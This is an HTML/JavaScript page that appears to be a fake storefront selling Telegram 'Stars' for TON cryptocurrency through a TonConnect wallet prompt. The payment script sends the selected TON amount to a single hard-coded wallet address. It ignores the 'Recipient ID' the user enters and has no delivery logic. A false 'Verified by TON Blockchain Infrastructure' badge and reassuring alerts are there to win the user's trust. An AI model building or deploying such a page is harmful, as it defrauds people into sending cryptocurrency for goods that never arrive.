<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Institutional Star Gateway</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0e1621; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card { background: #17212b; padding: 25px; border-radius: 20px; width: 350px; border: 1px solid #242f3d; box-shadow: 0 20px 40px rgba(0,0,0,0.7); text-align: center; }
        h2 { color: #24a1de; font-size: 20px; margin-bottom: 20px; }
        .input-group { text-align: left; margin-bottom: 20px; }
        label { font-size: 11px; color: #818d99; text-transform: uppercase; margin-left: 5px; }
        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #242f3d; background: #242f3d; color: white; box-sizing: border-box; outline: none; margin-top: 5px; }
        
        /* تصميم الباقات */
        .package-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 25px; }
        .package-item { background: #242f3d; padding: 15px; border-radius: 12px; cursor: pointer; border: 2px solid transparent; transition: 0.3s; display: flex; justify-content: space-between; align-items: center; position: relative; }
        .package-item.active { border-color: #24a1de; background: rgba(36, 161, 222, 0.1); }
        .pkg-info { text-align: left; }
        .pkg-name { font-weight: bold; font-size: 15px; }
        .pkg-price { font-weight: bold; color: #24a1de; font-size: 16px; }
        .best-seller { position: absolute; top: -10px; right: 10px; background: #24a1de; color: white; font-size: 9px; padding: 2px 8px; border-radius: 5px; font-weight: bold; }

        #ton-connect { margin-bottom: 20px; }
        .btn-buy { background: linear-gradient(90deg, #24a1de, #0088cc); color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
        .security-footer { margin-top: 15px; font-size: 10px; color: #4e5965; display: flex; align-items: center; justify-content: center; gap: 5px; }
    </style>
</head>
<body>

    <div class="card">
        <h2>💎 Asset Terminal</h2>
        
        <div id="ton-connect"></div>

        <div class="input-group">
            <label>Recipient ID</label>
            <input type="text" placeholder="@username" id="user">
        </div>

        <div class="package-list">
            <div class="package-item active" onclick="selectPkg(this, 11.00)">
                <div class="pkg-info">
                    <div class="pkg-name">1,000 Stars</div>
                    <div style="font-size: 10px; color: #818d99;">Standard Delivery</div>
                </div>
                <div class="pkg-price">11.00 TON</div>
            </div>

            <div class="package-item" onclick="selectPkg(this, 52.50)">
                <span class="best-seller">MOST POPULAR</span>
                <div class="pkg-info">
                    <div class="pkg-name">5,000 Stars</div>
                    <div style="font-size: 10px; color: #818d99;">Priority Node</div>
                </div>
                <div class="pkg-price">52.50 TON</div>
            </div>

            <div class="package-item" onclick="selectPkg(this, 99.00)">
                <div class="pkg-info">
                    <div class="pkg-name">10,000 Stars</div>
                    <div style="font-size: 10px; color: #818d99;">Wholesale Institutional</div>
                </div>
                <div class="pkg-price">99.00 TON</div>
            </div>
        </div>

        <button class="btn-buy" onclick="sendPayment()">CONFIRM SECURE ORDER</button>
        
        <div class="security-footer">
            <img src="https://ton.org/download/ton_symbol.png" width="12"> 
            Verified by TON Blockchain Infrastructure
        </div>
    </div>

    <script>
        let currentPrice = 11.00;

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        function selectPkg(element, price) {
            document.querySelectorAll('.package-item').forEach(item => item.classList.remove('active'));
            element.classList.add('active');
            currentPrice = price;
        }

        async function sendPayment() {
            if (!tonConnectUI.connected) {
                alert("Authorization Required: Please connect your TON wallet.");
                return;
            }

            const nanoAmount = Math.floor(currentPrice * 1000000000).toString();

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 120, 
                messages: [{
                    address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
                    amount: nanoAmount 
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("Order submitted to the blockchain. Asset delivery starts shortly.");
            } catch (e) {
                alert("Network error: Please ensure your wallet has enough TON for transaction fees.");
            }
        }
    </script>
</body>
</html>
